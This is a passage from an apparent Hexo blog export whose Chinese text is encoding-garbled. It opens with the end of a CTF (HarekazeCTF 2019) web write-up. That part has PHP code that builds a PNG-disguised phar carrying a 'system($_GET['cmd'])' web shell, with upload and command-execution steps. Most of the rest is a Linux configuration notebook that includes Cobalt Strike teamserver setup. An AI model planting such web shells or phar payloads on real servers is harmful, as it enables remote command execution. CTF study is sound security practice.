<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</span></span><br><span class="line">$png_header = hex2bin(<span class="string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'exp.css'</span>, <span class="string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;setStub($png_header . <span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¸Šä¼ æ–‡ä»¶ä¿®æ”¹session</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208101116758.png" alt="image-20200208101116758"></p>
<p><img src="/2020/02/07/buuoj-1/image-20200208101508941.png" alt="image-20200208101508941"></p>
</li>
<li><p>æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208101915660.png" alt="image-20200208101915660"></p>
</li>
</ol>
<p><strong>ref</strong>:<a href="https://nikoeurus.github.io/2019/11/07/HarekazeCTF2019-Web/" target="_blank" rel="noopener">2019 HarekazeCTF-Webéƒ¨åˆ†å¤ç°WriteUp</a></p>
]]></content>
      <tags>
        <tag>åˆ·é¢˜è®°å½•</tag>
      </tags>
  </entry>
  <entry>
    <title>é…ç½®</title>
    <url>/2019/05/04/%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>ä»¤äººå¤´å¤§çš„é…ç½®è®°å½•ï¼ŒæŒç»­æ›´æ–°</p>
<a id="more"></a>

<h3 id="debian-java-cobaltstrike-teamserverè¿è¡ŒæŠ¥é”™"><a href="#debian-java-cobaltstrike-teamserverè¿è¡ŒæŠ¥é”™" class="headerlink" title="debian java cobaltstrike teamserverè¿è¡ŒæŠ¥é”™"></a>debian java cobaltstrike teamserverè¿è¡ŒæŠ¥é”™</h3><p>java not $PATH :rootèº«ä»½è¿è¡ŒæŠ¥é”™ï¼Œæ²¡æœ‰javaç¯å¢ƒå˜é‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;java java &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;java 100</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;javac javac &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;javac 100</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;java_vm java_vm &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;java_vm 100</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;jcontrol jcontrol &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;jcontrol 100</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;jexec jexec &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;jre&#x2F;lib&#x2F;jexec 100</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;jexec jexec &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;jre&#x2F;lib&#x2F;jexec 100 --slave &#x2F;usr&#x2F;share&#x2F;binfmts&#x2F;jar jexec-binfmt media&#x2F;mydisk&#x2F;jdk&#x2F;jre&#x2F;lib&#x2F;javaws</span><br></pre></td></tr></table></figure>

<p>cobaltstrike </p>
<p>[-] keytool is not in $PATH<br>    install the Java Developer Kit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;bin&#x2F;keytool &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;keytool keytool &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;keytool 100</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒ</p>
<p><a href="https://superuser.com/questions/408918/trouble-setting-up-path-for-java-on-debian" target="_blank" rel="noopener">1</a></p>
<p><a href="https://askubuntu.com/questions/159575/how-do-i-make-java-default-to-a-manually-installed-jre-jdk" target="_blank" rel="noopener">2</a></p>
<h3 id="Ubuntuè™šæ‹Ÿæœº"><a href="#Ubuntuè™šæ‹Ÿæœº" class="headerlink" title="Ubuntuè™šæ‹Ÿæœº"></a>Ubuntuè™šæ‹Ÿæœº</h3><p>ç¡¬ç›˜30Gå·¦å³</p>
<h3 id="ubuntuå®‰è£…åå¸è½½ä¸å¸¸ç”¨çš„è½¯ä»¶"><a href="#ubuntuå®‰è£…åå¸è½½ä¸å¸¸ç”¨çš„è½¯ä»¶" class="headerlink" title="ubuntuå®‰è£…åå¸è½½ä¸å¸¸ç”¨çš„è½¯ä»¶"></a>ubuntuå®‰è£…åå¸è½½ä¸å¸¸ç”¨çš„è½¯ä»¶</h3><ul>
<li><p>16.04</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt purge libreoffice-common  unity-webapps-common thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese gnome-sudoku transmission-common gnome-orca webbrowser-app landscape-client-ui-install</span><br></pre></td></tr></table></figure>

<p>libreoffice-common libreofficeï¼ˆå¯ä»¥æ¢ WPSï¼‰<br>unity-webapps-common Amazon é“¾æ¥<br>thunderbird é›·é¸Ÿé‚®ä»¶å®¢æˆ·ç«¯<br>totem è‡ªå¸¦çš„æ’­æ”¾å™¨<br>rhythmbox è‡ªå¸¦çš„éŸ³ä¹æ’­æ”¾å™¨<br>empathy è‡ªå¸¦çš„å³æ—¶èŠå¤©åº”ç”¨<br>brasero è‡ªå¸¦çš„å…‰ç›˜åˆ»å½•å™¨<br>simple-scan æ‰«æä»ª<br>gnome-mahjongg å¯¹å¯¹ç¢°æ¸¸æˆ<br>aisleriot çº¸ç‰Œæ¸¸æˆ<br>gnome-mines æ‰«é›·æ¸¸æˆ<br>cheese webcam åº”ç”¨<br>gnome-sudoku æ•°ç‹¬æ¸¸æˆ<br>transmission-common BT å®¢æˆ·ç«¯<br>gnome-orca å±å¹•é˜…è¯»<br>webbrowser-app Ubuntu è‡ªå¸¦çš„æµè§ˆå™¨ï¼ˆæœ‰äº† chrome å’Œ Firefox æ ¹æœ¬ç”¨ä¸åˆ°è¿™ä¸ªï¼‰<br>landscape-client-ui-install landscape è¿œç¨‹æ§åˆ¶è½¯ä»¶<br>deja-dup å¤‡ä»½<br>onboard å±å¹•é”®ç›˜</p>
</li>
<li><p>18.04</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt remove ubuntu-web-launchers</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤Amazonçš„é“¾æ¥<br>sudo apt-get remove unity-webapps-common # æ—§ç‰ˆ</p>
<p>sudo apt remove ubuntu-web-launchers # æ–°ç‰ˆ</p>
</li>
</ul>
<h3 id="ubuntuæ¢æº"><a href="#ubuntuæ¢æº" class="headerlink" title="ubuntuæ¢æº"></a>ubuntuæ¢æº</h3><p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bak</span><br><span class="line">##ä¸‹ä¸€æ­¥è¦ç¡®å®šsource.listæ–‡ä»¶çš„å†…å®¹ï¼Œç„¶ååœ¨æ›¿æ¢</span><br><span class="line">sudo sed -i &quot;s&#x2F;us.archive.ubuntu.com&#x2F;mirrors.aliyun.com&#x2F;g&quot; &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br></pre></td></tr></table></figure>

<h3 id="ubuntuå®‰è£…docker"><a href="#ubuntuå®‰è£…docker" class="headerlink" title="ubuntuå®‰è£…docker"></a>ubuntuå®‰è£…docker</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">#æ·»åŠ ç¨³å®šç‰ˆä»“åº“</span><br><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository  &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu $(lsb_release -cs) stable&quot;</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce</span><br><span class="line">sudo docker run hello-world</span><br><span class="line">sudo usermod -a -G docker $USER</span><br><span class="line">#ä¸ºäº†å¯ä»¥ä¸ç”¨sudo,è¦æ³¨é”€é‡æ–°ç™»é™†</span><br></pre></td></tr></table></figure>

<p><a href="https://www.jianshu.com/p/49e8f814d6e0" target="_blank" rel="noopener">https://www.jianshu.com/p/49e8f814d6e0</a></p>
<h3 id="ubuntuæ›´æ¢phpç‰ˆæœ¬"><a href="#ubuntuæ›´æ¢phpç‰ˆæœ¬" class="headerlink" title="ubuntuæ›´æ¢phpç‰ˆæœ¬"></a>ubuntuæ›´æ¢phpç‰ˆæœ¬</h3><p>æŸ¥çœ‹å·²ç»å®‰è£…çš„phpåŒ…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg -l | grep php</span><br></pre></td></tr></table></figure>

<p><img src="/2019/05/04/%E9%85%8D%E7%BD%AE/image-20201120195140654.png" alt="image-20201120195140654"></p>
<p>å®‰è£…php5.6</p>
<p>ppa:ondrej/php æ˜¯ä¸€ä¸ªæ¯”è¾ƒçŸ¥åçš„PHPæºï¼ˆç›®å‰ç»´æŠ¤php5.6,php7.0,php7.1,php7.2ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:ondrej&#x2F;php</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install php5.6 </span><br><span class="line">sudo apt-get install php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml libapache2-mod-php5.6</span><br></pre></td></tr></table></figure>

<p><code>sudo update-alternatives --config php</code>å‘½ä»¤å¯ä»¥åˆ‡æ¢phpç‰ˆæœ¬</p>
<p>ä¿®æ”¹apacheçš„phpç‰ˆæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo a2dismod php7.0         # unload the current version</span><br><span class="line">sudo a2enmod  php5.6         # load the version you need</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>

<p>å®‰è£…php-gdæ‰©å±•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install php7.0-gd</span><br><span class="line">sudo apt-get install php7.0-zip</span><br></pre></td></tr></table></figure>

<p>å¼€å¯rewrite</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo a2enmod rewrite</span><br><span class="line"></span><br><span class="line">sudo a2dissite 000-default.conf</span><br><span class="line">sudo a2ensite 000-default.conf</span><br><span class="line">sudo  systemctl reload apache2</span><br></pre></td></tr></table></figure>

<h3 id="ubuntuè®¾ç½®ä»£ç†"><a href="#ubuntuè®¾ç½®ä»£ç†" class="headerlink" title="ubuntuè®¾ç½®ä»£ç†"></a>ubuntuè®¾ç½®ä»£ç†</h3><ul>
<li>ä¸´æ—¶</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890</span><br><span class="line">export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890</span><br><span class="line">export no_proxy&#x3D;&quot;127.0.0.1, localhost, *.cnn.com, 192.168.1.10, domain.com:8080&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>ä¸´æ—¶å–æ¶ˆä»£ç†<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unset http_proxy</span><br><span class="line"></span><br><span class="line">unset https_proxy</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>æŒä¹…åŒ–</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim ~&#x2F;.bashrc</span><br><span class="line">export http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890</span><br><span class="line">export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890</span><br><span class="line">export no_proxy&#x3D;&quot;127.0.0.1, localhost, *.cnn.com, 192.168.1.10, domain.com:8080&quot;</span><br><span class="line">source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>

<h3 id="mongodb-Ubuntuå®‰è£…åŠæŠ¥é”™"><a href="#mongodb-Ubuntuå®‰è£…åŠæŠ¥é”™" class="headerlink" title="mongodb Ubuntuå®‰è£…åŠæŠ¥é”™"></a>mongodb Ubuntuå®‰è£…åŠæŠ¥é”™</h3><p><a href="https://www.jb51.net/article/109091.htm" target="_blank" rel="noopener">https://www.jb51.net/article/109091.htm</a></p>
<p><a href="https://blog.csdn.net/zn505119020/article/details/81331808" target="_blank" rel="noopener">https://blog.csdn.net/zn505119020/article/details/81331808</a></p>
<h3 id="apt-get-install-æŠ¥é”™"><a href="#apt-get-install-æŠ¥é”™" class="headerlink" title="apt-get install æŠ¥é”™"></a>apt-get install æŠ¥é”™</h3><p>E: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)<br> E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it</p>
<p>åœ¨ç»ˆç«¯ä¸­æ•²å…¥ä»¥ä¸‹ä¸¤å¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;lock</span><br><span class="line"></span><br><span class="line">sudo rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock</span><br></pre></td></tr></table></figure>

<h3 id="lamp"><a href="#lamp" class="headerlink" title="lamp"></a>lamp</h3><p>å®‰è£…å¤šç‰ˆæœ¬php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:ondrej&#x2F;php</span><br><span class="line">sudo apt-get update</span><br><span class="line">#ä¸‹è½½php5.6çš„å‘½ä»¤</span><br><span class="line">sudo apt-get install -y php5.6-common php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml php5.6-gd php5.6-curl php5.6-json php5.6-fpm php5.6-zip php5.6-mcrypt libapache2-mod-php5.6</span><br><span class="line">#ä¸‹è½½php7.0çš„å‘½ä»¤</span><br><span class="line">sudo apt-get install -y php7.0-common php7.0-mbstring php7.0-mcrypt php7.0-mysql php7.0-xml php7.0-gd php7.0-curl php7.0-json php7.0-fpm php7.0-zip php7.0-mcrypt libapache2-mod-php7.0</span><br><span class="line">#ä¸‹è½½php7.1çš„å‘½ä»¤</span><br><span class="line">sudo apt-get install -y php7.1-common php7.1-mbstring php7.1-mcrypt php7.1-mysql php7.1-xml php7.1-gd php7.1-curl php7.1-json php7.1-fpm php7.1-zip php7.1-mcrypt libapache2-mod-php7.1</span><br><span class="line"># ä¸‹è½½php7.4çš„å‘½ä»¤</span><br><span class="line">sudo apt-get install -y php7.4-common php7.4-mbstring php7.4-mcrypt php7.4-mysql php7.4-xml php7.4-gd php7.4-curl php7.4-json php7.4-fpm php7.4-zip php7.4-mcrypt libapache2-mod-php7.4</span><br><span class="line"># ä¸‹è½½php7.2çš„å‘½ä»¤</span><br><span class="line">sudo apt-get install -y php7.2-common php7.2-mbstring php7.2-mcrypt php7.2-mysql php7.2-xml php7.2-gd php7.2-curl php7.2-json php7.2-fpm php7.2-zip php7.2-mcrypt libapache2-mod-php7.2  php7.2-dev</span><br><span class="line"></span><br><span class="line">sudo apt-get install -y php7.4.3-common php7.4.3-mbstring php7.4.3-mcrypt php7.4.3-mysql php7.4.3-xml php7.4.3-gd php7.4.3-curl php7.4.3-json php7.4.3-fpm php7.4.3-zip php7.4.3-mcrypt libapache2-mod-php7.4.3</span><br><span class="line">#åˆ‡æ¢é»˜è®¤phpç‰ˆæœ¬</span><br><span class="line">sudo update-alternatives --config php ä¿®æ”¹ç‰ˆæœ¬</span><br><span class="line">#PS:åˆ‡æ¢ç‰ˆæœ¬ä¹‹å‰æˆ–åˆ‡æ¢ä¹‹åè¦æŠŠè¢«åˆ‡æ¢é¢ç‰ˆæœ¬åœç”¨</span><br><span class="line">#å¼€å¯ä¸€ä¸ªphpç‰ˆæœ¬</span><br><span class="line">sudo a2enmod php7.1</span><br><span class="line"># ç¦ç”¨ä¸€ä¸ªphpç‰ˆæœ¬</span><br><span class="line">sudo a2dismod php7.1</span><br><span class="line">#é‡å¯Apache2</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>

<p>å¸è½½php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¸€ã€åˆ é™¤phpçš„ç›¸å…³åŒ…åŠé…ç½®</span><br><span class="line">   sudo apt-get autoremove php7*</span><br><span class="line">äºŒã€åˆ é™¤å…³è”</span><br><span class="line">   sudo find &#x2F;etc -name &quot;*php*&quot; |xargs rm -rf</span><br><span class="line">ä¸‰ã€æ¸…é™¤deptåˆ—è¡¨</span><br><span class="line">   sudo apt purge &#96;dpkg -l | grep php| awk &#39;&#123;print $2&#125;&#39; |tr &quot;\n&quot; &quot; &quot;&#96;</span><br><span class="line">å››ã€æ£€æŸ¥æ˜¯å¦å¸è½½å¹²å‡€ï¼ˆæ— è¿”å›å°±æ˜¯å¸è½½å®Œæˆï¼‰</span><br><span class="line">   dpkg -l | grep php7.0</span><br></pre></td></tr></table></figure>

<p>å®‰è£…phpã€apache2ã€ mysql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt list | grep libapache2-mod-php*</span><br><span class="line">sudo apt-get install php7.2 libapache2-mod-php7.2</span><br><span class="line">sudo apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure>

<p>ubuntu 18å®‰è£…mysqlè¿‡ç¨‹æœªå‡ºç°è®¾ç½®å¯†ç ç•Œé¢ï¼Œä¿®æ”¹é»˜è®¤å¯†ç æ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo cat &#x2F;etc&#x2F;mysql&#x2F;debian.cnf</span><br></pre></td></tr></table></figure>

<img src="/2019/05/04/%E9%85%8D%E7%BD%AE/image-20211018080209019.png" alt="image-20211018080209019" style="zoom:150%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u debian-sys-maint -p</span><br></pre></td></tr></table></figure>

<p><a href="https://zhuanlan.zhihu.com/p/348317883" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/348317883</a></p>
<p>è¾“å…¥ä¸Šå›¾ä¸­å¯†ç ï¼Œç™»å½•åï¼Œä¿®æ”¹rootå¯†ç ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use mysql;                   </span><br><span class="line"></span><br><span class="line">update mysql.user set authentication_string&#x3D;password(&#39;root&#39;) where user&#x3D;&#39;root&#39; and Host &#x3D;&#39;localhost&#39;;    </span><br><span class="line"></span><br><span class="line">update user set  plugin&#x3D;&quot;mysql_native_password&quot;;     </span><br><span class="line"></span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">quit;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter user root@localhost identified with caching_sha2_password by &quot;root&quot;; #mysql8</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt purge mysql-*</span><br><span class="line"></span><br><span class="line">sudo rm -rf &#x2F;etc&#x2F;mysql&#x2F; &#x2F;var&#x2F;lib&#x2F;mysql</span><br><span class="line"></span><br><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹/var/www/htmlç›®å½•æƒé™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chown -R www-data:www-data &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">sudo chmod -R 755 &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>

<p>å®‰è£…phpæ‰©å±•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install php7.2-dev ï¼ˆphpizeå‘½ä»¤ä¸å­˜åœ¨ï¼‰</span><br><span class="line">sudo pecl install xdebug</span><br></pre></td></tr></table></figure>

<p>php.iniæ–‡ä»¶ä½ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;php&#x2F;7.2&#x2F;apache2&#x2F;php.ini</span><br></pre></td></tr></table></figure>

<p>é…ç½®xdebug3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension&#x3D;&#x2F;usr&#x2F;lib&#x2F;php&#x2F;20170718&#x2F;xdebug.so</span><br><span class="line">xdebug.mode&#x3D;debug,coverage,develop,trace,</span><br><span class="line">xdebug.client_host&#x3D;127.0.0.1</span><br><span class="line">xdebug.client_port&#x3D;&quot;9003&quot;</span><br><span class="line">xdebug.overload_var_dump&#x3D;1</span><br><span class="line">xdebug.trace_format &#x3D; 1</span><br><span class="line"></span><br><span class="line">[Xdebug]</span><br><span class="line">zend_extension&#x3D;&#x2F;usr&#x2F;lib&#x2F;php&#x2F;20170718&#x2F;xdebug.so</span><br><span class="line">xdebug.mode&#x3D;trace</span><br><span class="line">xdebug.start_with_request&#x3D;trigger</span><br><span class="line">xdebug.trigger_value&#x3D;StartProfileForMe</span><br><span class="line">xdebug.trace_output_name &#x3D; xdebug.trace.%t.%s</span><br><span class="line">xdebug.output_dir &#x3D; &#x2F;var&#x2F;www&#x2F;tmp</span><br><span class="line">xdebug.trace_format&#x3D;1</span><br><span class="line"></span><br><span class="line">XDEBUG_TRACE&#x3D;StartProfileForMe</span><br><span class="line"></span><br><span class="line">[Xdebug]</span><br><span class="line">zend_extension&#x3D;&#x2F;usr&#x2F;lib&#x2F;php&#x2F;20200930&#x2F;xdebug.so</span><br><span class="line">xdebug.mode&#x3D;trace</span><br><span class="line">xdebug.start_with_request&#x3D;trigger</span><br><span class="line">xdebug.trigger_value&#x3D;StartProfileForMe</span><br><span class="line">xdebug.trace_output_name &#x3D; xdebug</span><br><span class="line">xdebug.output_dir &#x3D; &#x2F;tmp</span><br><span class="line">xdebug.trace_format&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/2019/05/04/%E9%85%8D%E7%BD%AE/image-20211029104511689.png" alt="image-20211029104511689"></p>
<h3 id="ubuntu18å®‰è£…composer"><a href="#ubuntu18å®‰è£…composer" class="headerlink" title="ubuntu18å®‰è£…composer"></a>ubuntu18å®‰è£…composer</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ç¬¬ä¸€ç§æ–¹æ³•ï¼šsudo apt-get install composer</span><br><span class="line">ç¬¬äºŒç§æ–¹æ³•ï¼šç›´æ¥ä½¿ç”¨composer.pharå¯æ‰§è¡Œæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h4 id="åˆå§‹åŒ–-init"><a href="#åˆå§‹åŒ–-init" class="headerlink" title="åˆå§‹åŒ– init"></a>åˆå§‹åŒ– <code>init</code></h4><p>åœ¨ <a href="https://docs.phpcomposer.com/02-libraries.html" target="_blank" rel="noopener">â€œåº“â€</a> é‚£ä¸€ç« æˆ‘ä»¬çœ‹åˆ°äº†å¦‚ä½•æ‰‹åŠ¨åˆ›å»º <code>composer.json</code> æ–‡ä»¶ã€‚å®é™…ä¸Šè¿˜æœ‰ä¸€ä¸ª <code>init</code> å‘½ä»¤å¯ä»¥æ›´å®¹æ˜“çš„åšåˆ°è¿™ä¸€ç‚¹ã€‚</p>
<p>å½“æ‚¨è¿è¡Œè¯¥å‘½ä»¤ï¼Œå®ƒä¼šä»¥äº¤äº’æ–¹å¼è¦æ±‚æ‚¨å¡«å†™ä¸€äº›ä¿¡æ¯ï¼ŒåŒæ—¶èªæ˜çš„ä½¿ç”¨ä¸€äº›é»˜è®¤å€¼ã€‚</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar init</span><br></pre></td></tr></table></figure>

<h5 id="åˆå§‹åŒ–-å‚æ•°"><a href="#åˆå§‹åŒ–-å‚æ•°" class="headerlink" title="åˆå§‹åŒ–-å‚æ•°"></a>åˆå§‹åŒ–-å‚æ•°</h5><ul>
<li><strong>â€“name:</strong> åŒ…çš„åç§°ã€‚</li>
<li><strong>â€“description:</strong> åŒ…çš„æè¿°ã€‚</li>
<li><strong>â€“author:</strong> åŒ…çš„ä½œè€…ã€‚</li>
<li><strong>â€“homepage:</strong> åŒ…çš„ä¸»é¡µã€‚</li>
<li><strong>â€“require:</strong> éœ€è¦ä¾èµ–çš„å…¶å®ƒåŒ…ï¼Œå¿…é¡»è¦æœ‰ä¸€ä¸ªç‰ˆæœ¬çº¦æŸã€‚å¹¶ä¸”åº”è¯¥éµå¾ª <code>foo/bar:1.0.0</code> è¿™æ ·çš„æ ¼å¼ã€‚</li>
<li><strong>â€“require-dev:</strong> å¼€å‘ç‰ˆçš„ä¾èµ–åŒ…ï¼Œå†…å®¹æ ¼å¼ä¸ <strong>â€“require</strong> ç›¸åŒã€‚</li>
<li><strong>â€“stability (-s):</strong> <code>minimum-stability</code> å­—æ®µçš„å€¼ã€‚</li>
</ul>
<h4 id="å®‰è£…-install"><a href="#å®‰è£…-install" class="headerlink" title="å®‰è£… install"></a>å®‰è£… <code>install</code></h4><p><code>install</code> å‘½ä»¤ä»å½“å‰ç›®å½•è¯»å– <code>composer.json</code> æ–‡ä»¶ï¼Œå¤„ç†äº†ä¾èµ–å…³ç³»ï¼Œå¹¶æŠŠå…¶å®‰è£…åˆ° <code>vendor</code> ç›®å½•ä¸‹ã€‚</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar install</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå½“å‰ç›®å½•ä¸‹å­˜åœ¨ <code>composer.lock</code> æ–‡ä»¶ï¼Œå®ƒä¼šä»æ­¤æ–‡ä»¶è¯»å–ä¾èµ–ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯æ ¹æ® <code>composer.json</code> æ–‡ä»¶å»è·å–ä¾èµ–ã€‚è¿™ç¡®ä¿äº†è¯¥åº“çš„æ¯ä¸ªä½¿ç”¨è€…éƒ½èƒ½å¾—åˆ°ç›¸åŒçš„ä¾èµ–ç‰ˆæœ¬ã€‚</p>
<p>å¦‚æœæ²¡æœ‰ <code>composer.lock</code> æ–‡ä»¶ï¼Œcomposer å°†åœ¨å¤„ç†å®Œä¾èµ–å…³ç³»ååˆ›å»ºå®ƒã€‚</p>
<h5 id="å®‰è£…-å‚æ•°"><a href="#å®‰è£…-å‚æ•°" class="headerlink" title="å®‰è£…-å‚æ•°"></a>å®‰è£…-å‚æ•°</h5><ul>
<li><strong>â€“prefer-source:</strong> ä¸‹è½½åŒ…çš„æ–¹å¼æœ‰ä¸¤ç§ï¼š <code>source</code> å’Œ <code>dist</code>ã€‚å¯¹äºç¨³å®šç‰ˆæœ¬ composer å°†é»˜è®¤ä½¿ç”¨ <code>dist</code> æ–¹å¼ã€‚è€Œ <code>source</code> è¡¨ç¤ºç‰ˆæœ¬æ§åˆ¶æº ã€‚å¦‚æœ <code>--prefer-source</code> æ˜¯è¢«å¯ç”¨çš„ï¼Œcomposer å°†ä» <code>source</code> å®‰è£…ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚å¦‚æœæƒ³è¦ä½¿ç”¨ä¸€ä¸ª bugfix åˆ°ä½ çš„é¡¹ç›®ï¼Œè¿™æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚å¹¶ä¸”å¯ä»¥ç›´æ¥ä»æœ¬åœ°çš„ç‰ˆæœ¬åº“ç›´æ¥è·å–ä¾èµ–å…³ç³»ã€‚</li>
<li><strong>â€“prefer-dist:</strong> ä¸ <code>--prefer-source</code> ç›¸åï¼Œcomposer å°†å°½å¯èƒ½çš„ä» <code>dist</code> è·å–ï¼Œè¿™å°†å¤§å¹…åº¦çš„åŠ å¿«åœ¨ build servers ä¸Šçš„å®‰è£…ã€‚è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå›é¿ git é—®é¢˜çš„é€”å¾„ï¼Œå¦‚æœä½ ä¸æ¸…æ¥šå¦‚ä½•æ­£ç¡®çš„è®¾ç½®ã€‚</li>
<li><strong>â€“dry-run:</strong> å¦‚æœä½ åªæ˜¯æƒ³æ¼”ç¤ºè€Œå¹¶éå®é™…å®‰è£…ä¸€ä¸ªåŒ…ï¼Œä½ å¯ä»¥è¿è¡Œ <code>--dry-run</code> å‘½ä»¤ï¼Œå®ƒå°†æ¨¡æ‹Ÿå®‰è£…å¹¶æ˜¾ç¤ºå°†ä¼šå‘ç”Ÿä»€ä¹ˆã€‚</li>
<li><strong>â€“dev:</strong> å®‰è£… <code>require-dev</code> å­—æ®µä¸­åˆ—å‡ºçš„åŒ…ï¼ˆè¿™æ˜¯ä¸€ä¸ªé»˜è®¤å€¼ï¼‰ã€‚</li>
